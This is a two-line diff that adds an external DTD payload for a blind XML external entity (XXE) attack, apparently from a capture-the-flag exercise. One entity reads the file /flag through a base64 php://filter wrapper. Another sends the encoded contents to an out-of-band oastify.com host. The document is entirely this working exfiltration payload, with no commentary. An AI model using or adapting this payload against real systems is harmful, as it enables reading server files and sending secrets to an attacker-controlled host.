@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://hn8ujxwvvq64i8nkt8wkyx70mrsigi47.oastify.com/?d=%data;'>">
